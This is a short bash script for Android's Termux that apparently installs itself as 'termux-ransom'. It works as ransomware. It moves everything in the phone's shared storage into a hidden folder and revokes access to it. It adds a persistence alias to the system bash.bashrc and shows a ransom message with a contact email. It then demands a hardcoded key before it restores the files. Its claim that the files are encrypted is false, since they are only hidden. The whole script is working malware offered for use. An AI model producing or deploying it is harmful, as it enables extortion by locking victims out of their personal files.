pkg install termimage
termux-setup-storage
mkdir /$HOME/.rfkzk
mv /sdcard/* /data/data/com.termux/files/home/.rfkzk
$chmod u=w /$HOME/.rfkzk
mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂
chmod u=x *
chmod u=rwx 1705743575411.png
clear
echo -e "alias IMAGE='cd /data/data/com.termux/files/home/termux-ransom ; bash install.sh'" >> /data/data/com.termux/files/usr/etc/bash.bashrc
sed -i '9s/echo/#/' install.sh || sed -i '10s/echo/#/' install.sh
termimage 1705743575411.png
echo -e "\033[7;49;91m YOUR FILES ARE ENCRYPTED PLEASE ENTER THE KEY-WORD BELLOW!\033[m"
echo ""
echo -e "\033[0;49;92m Talk with the\033[m\033[0;49;93m userpropez8183718@proton.me\033[0;49;92m To get the Encrypt Key!\033[m"
sleep 1
while :
do
	echo -e "\033[4;49;92m"
	read -p "Encrypted Key: " key      
	echo -e "\033[m"
	if [ "$key" == "HoigIgDyufydUd3a%e7t*g9h9hs2g9sgi29hs1oh1ss1s19h" ]
	then
		echo -e "\033[0;49;92m THANK YOU FOR YOUR PAYMENT!\033[m"
		echo -e "\033[0;49;95m Please Check Your Gallery!"
		chmod u=rwx /$HOME/.rfkzk
		mv /$HOME/.rfkzk/* /sdcard
		sed -i 's/alias/#/' /data/data/com.termux/files/usr/etc/bash.bashrc
		break
	else
		echo -e "Please try again :("
		sleep 1
	fi



done
